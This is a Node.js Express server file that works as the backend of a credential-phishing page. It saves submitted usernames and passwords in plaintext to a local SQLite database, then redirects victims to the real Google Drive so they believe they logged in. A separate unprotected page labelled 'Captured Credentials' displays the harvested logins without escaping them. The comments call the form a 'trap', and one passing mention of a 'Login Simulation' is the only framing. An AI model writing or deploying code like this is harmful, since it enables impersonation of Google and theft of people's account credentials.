const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const port = 3000;

// 1. Setup local database file
const db = new sqlite3.Database('./users.db', (err) => {
    if (err) console.error("Database connection error:", err.message);
    else console.log("Connected to local users.db file.");
});

// 2. Create the table (Added a 'timestamp' column to see when they logged in)
db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname)); 

// 3. The "Trap" Register Route
// When someone clicks your button, it saves their data and REDIRECTS them.
app.post('/register', (req, res) => {
    const { username, password } = req.body; 
    const sql = `INSERT INTO users (username, password) VALUES (?, ?)`;
    
    db.run(sql, [username, password], function(err) {
        if (err) {
            console.error("Error saving data:", err.message);
        }
        // Redirect them to the REAL Google Drive so they think they just logged in
        res.redirect('https://drive.google.com');
    });
});

// 4. YOUR PRIVATE VIEW PAGE
// Only YOU should visit this URL to see the captured details
app.get('/view-users', (req, res) => {
    db.all("SELECT * FROM users ORDER BY timestamp DESC", [], (err, rows) => {
        if (err) return res.status(500).send("Error reading database.");
        
        let tableRows = rows.map(user => `
            <tr>
                <td style="border: 1px solid black; padding: 8px;">${user.timestamp}</td>
                <td style="border: 1px solid black; padding: 8px;">${user.username}</td>
                <td style="border: 1px solid black; padding: 8px;">${user.password}</td>
            </tr>
        `).join('');

        res.send(`
            <h1>Captured Credentials</h1>
            <table style="border-collapse: collapse; width: 80%; font-family: sans-serif;">
                <thead>
                    <tr style="background-color: #f2f2f2;">
                        <th style="border: 1px solid black; padding: 8px;">Time</th>
                        <th style="border: 1px solid black; padding: 8px;">Username</th>
                        <th style="border: 1px solid black; padding: 8px;">Password</th>
                    </tr>
                </thead>
                <tbody>
                    ${tableRows}
                </tbody>
            </table>
            <br>
            <a href="/">Back to Login Simulation</a>
        `);
    });
});

// 5. START SERVER
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
    console.log(`To see results, visit: http://localhost:${port}/view-users`);
});